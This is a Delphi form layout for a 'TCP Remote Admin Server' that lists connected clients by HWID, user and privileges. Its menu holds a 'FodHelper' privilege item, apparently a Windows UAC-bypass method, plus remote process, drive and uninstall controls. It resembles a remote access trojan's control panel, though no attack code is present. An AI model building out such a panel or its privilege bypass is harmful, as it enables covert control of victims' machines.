object Form1: TForm1
  Left = 0
  Top = 0
  Caption = 'TCP Remote Admin Server'
  ClientHeight = 400
  ClientWidth = 784
  Color = clBtnFace
  Font.Charset = DEFAULT_CHARSET
  Font.Color = clWindowText
  Font.Height = -12
  Font.Name = 'Segoe UI'
  Font.Style = []
  OnCreate = FormCreate
  OnDestroy = FormDestroy
  TextHeight = 15
  object ListView1: TListView
    Left = 0
    Top = 0
    Width = 784
    Height = 400
    Align = alClient
    Columns = <
      item
        Caption = 'Address'
        Width = 100
      end
      item
        Caption = 'HWID'
        Width = 100
      end
      item
        Caption = 'Machine'
        Width = 100
      end
      item
        Caption = 'User'
        Width = 100
      end
      item
        Caption = 'Privs'
        Width = 100
      end
      item
        Caption = 'System'
        Width = 100
      end
      item
        Caption = 'CPU'
        Width = 100
      end
      item
        Caption = 'RAM'
        Width = 100
      end
      item
        Caption = 'Disk'
        Width = 100
      end>
    HideSelection = False
    MultiSelect = True
    ReadOnly = True
    RowSelect = True
    PopupMenu = PopupMenu1
    TabOrder = 0
    ViewStyle = vsReport
  end
  object PopupMenu1: TPopupMenu
    Left = 200
    Top = 120
    object PrivilegeManager1: TMenuItem
      Caption = 'Privilege Management'
      object FodHelper1: TMenuItem
        Caption = 'FodHelper'
        OnClick = FodHelper1Click
      end
    end
    object SystemManagement1: TMenuItem
      Caption = 'System Management'
      object DriveViewer1: TMenuItem
        Caption = 'Drive Viewer'
        OnClick = GetDiskInfo1Click
      end
      object ProcessManager1: TMenuItem
        Caption = 'Process Manager'
        OnClick = GetRunningProcesses1Click
      end
    end
    object ClientControl1: TMenuItem
      Caption = 'Client Control'
      object Restart1: TMenuItem
        Caption = 'Restart'
        OnClick = Restart1Click
      end
      object Close1: TMenuItem
        Caption = 'Close'
        OnClick = Close1Click
      end
      object Uninstall1: TMenuItem
        Caption = 'Uninstall'
        OnClick = Uninstall1Click
      end
    end
  end
  object IdTCPServer1: TIdTCPServer
    Bindings = <>
    DefaultPort = 0
    OnConnect = IdTCPServer1Connect
    OnDisconnect = IdTCPServer1Disconnect
    OnExecute = IdTCPServer1Execute
    Left = 320
    Top = 120
  end
end
